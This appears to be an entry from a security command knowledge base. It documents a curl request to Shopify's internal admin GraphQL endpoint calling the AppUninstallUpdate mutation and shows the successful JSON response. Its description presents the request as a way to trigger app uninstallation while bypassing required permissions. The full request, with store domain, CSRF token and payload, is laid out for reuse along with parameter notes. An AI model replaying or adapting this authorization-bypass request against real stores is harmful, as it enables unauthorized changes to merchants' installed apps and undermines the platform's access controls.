---
id: cmd-shopify-app-uninstall-update-graphql
data: >-
  curl -X POST
  'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=AppUninstallUpdate&type=mutation'
  -H 'Host: sardasigni.myshopify.com' -H 'Connection: close' -H 'Content-Length:
  425' -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="97",
  "Chromium";v="97"' -H 'X-CSRF-Token: S95lTH3N-Y2E_E2tYg_ZKpEdyPL7SSsF0Wkc' -H
  'sec-ch-ua-mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
  x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'
  -H 'content-type: application/json' -H 'accept: application/json' -H
  'X-Shopify-Web-Force-Proxy: 1' -H 'sec-ch-ua-platform: "Windows"' -H 'Origin:
  https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H
  'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip,
  deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: Your-cookie' -d
  '{"operationName":"AppUninstallUpdate","variables":{"input":{"id":"gid://shopify/App/6431859","feedback":null,"feedbackDescription":null,"extraAttributes":null}},"query":"mutation
  AppUninstallUpdate($input: AppUninstallInput!) {\n appUninstall(input: $input)
  {\n app {\n title\n isChannel\n __typename\n }\n userErrors {\n field\n
  message\n __typename\n }\n __typename\n }\n}\n"}'
tags:
  - graphql
  - shopify
  - app-update
type: command
output: >-
  {"data":{"appUninstall":{"app":{"title":"this is for
  testing","isChannel":false,"__typename":"App"},"userErrors":[],"__typename":"AppUninstallPayload"}},"extensions":{"cost":{"requestedQueryCost":10,"actualQueryCost":10,"throttleStatus":{"maximumAvailable":5000.0,"currentlyAvailable":4990,"restoreRate":250.0}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.702Z'
verified: false
validated: true
submitted: true
---
# shopify-app-uninstall-update-graphql

## Command

```bash
curl -X POST 'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=AppUninstallUpdate&type=mutation' -H 'Host: sardasigni.myshopify.com' -H 'Connection: close' -H 'Content-Length: 425' -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"' -H 'X-CSRF-Token: S95lTH3N-Y2E_E2tYg_ZKpEdyPL7SSsF0Wkc' -H 'sec-ch-ua-mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36' -H 'content-type: application/json' -H 'accept: application/json' -H 'X-Shopify-Web-Force-Proxy: 1' -H 'sec-ch-ua-platform: "Windows"' -H 'Origin: https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: Your-cookie' -d '{"operationName":"AppUninstallUpdate","variables":{"input":{"id":"gid://shopify/App/6431859","feedback":null,"feedbackDescription":null,"extraAttributes":null}},"query":"mutation AppUninstallUpdate($input: AppUninstallInput!) {\n appUninstall(input: $input) {\n app {\n title\n isChannel\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n __typename\n }\n}\n"}'
```

## Description

GraphQL mutation using AppUninstallUpdate to trigger app uninstallation via an update payload, bypassing required permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id` | Global ID of the app | Yes |
| `feedback` | Null feedback | No |
| `feedbackDescription` | Null description | No |
| `extraAttributes` | Null extras | No |
| `Cookie` | Session cookie | Yes |
| `X-CSRF-Token` | CSRF token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST [endpoint] [headers] -d '[payload with id and nulls]'
```

### Advanced Usage

Customize null fields if API evolves; ensure HTTP/1.1 compatibility.

## Expected Output

JSON confirming uninstall: {"data":{"appUninstall":{"app":{"title":"this is for testing","isChannel":false,"__typename":"App"},"userErrors":[]}}}

## Related

- [[commands/shopify-uninstall-custom-app-graphql]]
- [[procedures/Execute-GraphQL-App-Uninstall-Mutation]]
